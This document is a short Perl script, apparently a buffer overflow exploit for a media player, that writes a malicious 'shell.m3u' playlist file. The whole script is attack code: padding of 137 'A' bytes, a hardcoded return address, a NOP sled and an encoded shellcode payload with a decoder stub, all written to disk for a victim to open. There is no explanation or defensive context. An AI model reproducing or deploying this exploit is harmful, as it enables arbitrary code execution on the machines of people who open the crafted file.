$file= "shell.m3u";

$buffer= "\\";
$buffer .="A" x 137;
$buffer .= pack('V',0x7E429353);
$buffer .= "\x90" x 30;
$buffer .="\x33\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76" .
"\x0e\xb6\x90\x34\xd7\x83\xee\xfc\xe2\xf4\x4a\x78\xb6\xd7" .
"\xb6\x90\x54\x5e\x53\xa1\xf4\xb3\x3d\xc0\x04\x5c\xe4\x9c" .
"\xbf\x85\xa2\x1b\x46\xff\xb9\x27\x7e\xf1\x87\x6f\x98\xeb" .
"\xd7\xec\x36\xfb\x96\x51\xfb\xda\xb7\x57\xd6\x25\xe4\xc7" .
"\xbf\x85\xa6\x1b\x7e\xeb\x3d\xdc\x25\xaf\x55\xd8\x35\x06" .
"\xe7\x1b\x6d\xf7\xb7\x43\xbf\x9e\xae\x73\x0e\x9e\x3d\xa4" .
"\xbf\xd6\x60\xa1\xcb\x7b\x77\x5f\x39\xd6\x71\xa8\xd4\xa2" .
"\x40\x93\x49\x2f\x8d\xed\x10\xa2\x52\xc8\xbf\x8f\x92\x91" .
"\xe7\xb1\x3d\x9c\x7f\x5c\xee\x8c\x35\x04\x3d\x94\xbf\xd6" .
"\x66\x19\x70\xf3\x92\xcb\x6f\xb6\xef\xca\x65\x28\x56\xcf" .
"\x6b\x8d\x3d\x82\xdf\x5a\xeb\xfa\x35\x5a\x33\x22\x34\xd7" .
"\xb6\xc0\x5c\xe6\x3d\xff\xb3\x28\x63\x2b\xc4\x62\x14\xc6" .
"\x5c\x71\x23\x2d\xa9\x28\x63\xac\x32\xab\xbc\x10\xcf\x37" .
"\xc3\x95\x8f\x90\xa5\xe2\x5b\xbd\xb6\xc3\xcb\x02\xd5\xf1" .
"\x58\xb4\x98\xf5\x4c\xb2\xb6\x90\x34\xd7";





open($FILE,">$file");
print $FILE $buffer;
close($FILE);
